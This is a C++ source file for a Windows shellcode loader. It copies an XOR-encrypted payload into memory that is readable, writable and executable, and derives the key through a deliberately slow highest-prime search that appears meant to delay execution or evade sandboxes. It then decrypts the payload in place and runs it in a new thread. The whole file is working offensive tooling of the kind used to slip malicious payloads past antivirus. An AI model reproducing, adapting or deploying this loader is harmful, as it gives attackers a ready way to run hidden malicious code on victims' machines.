#include "shellcode.h"
shellcode::shellcode(unsigned char *raw)
{
	this->m_shellcode_length = *(SIZE_T *)raw;
	unsigned long long int nums_border = *(reinterpret_cast<unsigned long long int*>(raw + 4));

	LPCVOID shellcode = static_cast<BYTE*>(raw + 13);

	LPVOID process_memory = VirtualAlloc(NULL, m_shellcode_length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	SIZE_T bytesWritten;
	HANDLE current_process = GetCurrentProcess();
	WriteProcessMemory(current_process, process_memory, shellcode, m_shellcode_length, &bytesWritten);

	unsigned long long int prime = this->find_highest_prime(nums_border);
	BYTE shellcode_key = this->prime_to_key(prime);
	this->decrypt_memory(process_memory, shellcode_key, this->m_shellcode_length);
	this->m_shellcode_address = process_memory;
}

shellcode::~shellcode()
{
	
	WaitForSingleObject(this->m_thread_handle, INFINITE);
	CloseHandle(this->m_thread_handle);
	
	VirtualFree(this->m_shellcode_address, this->m_shellcode_length, MEM_DECOMMIT);

	this->m_shellcode_address = 0;
	this->m_shellcode_length = 0;
}

void shellcode::Run()
{
 	this->m_thread_handle = CreateThread(NULL, 0, this->ExecuteThread, this->m_shellcode_address, 0, NULL);
}

void shellcode::decrypt_memory(LPVOID address, unsigned char xor_key, int length)
{
	unsigned char* sc_byte = (unsigned char*)address;
	for (int i = 0; i < length; i++) {
		*sc_byte = *sc_byte ^ xor_key;
		sc_byte++;
	}
}

BYTE shellcode::prime_to_key(unsigned long long int number) {
	char* b1 = reinterpret_cast<char*>(&number);
	char* b2 = b1 + 2;
	char* b3 = b1 + 5;
	char* b4 = b1 + 7;

	BYTE hash_value = *b1 ^ *b2 ^ *b3 ^ *b4;
	return hash_value;
}

unsigned long long int shellcode::find_highest_prime(unsigned long long int border) {
	unsigned long long int final_prime_number = 0;
	for (unsigned long long int i = 2; i < border; i++)
		for (unsigned long long int j = 2; j*j <= i; j++)
		{
			if (i % j == 0)
				break;
			else if (j + 1 > sqrt(i)) {
				final_prime_number = i;
			}
		}

	return final_prime_number;
}

DWORD WINAPI shellcode::ExecuteThread(LPVOID shellcode_address)
{
	((void(*)())shellcode_address)();
	return 1;
}
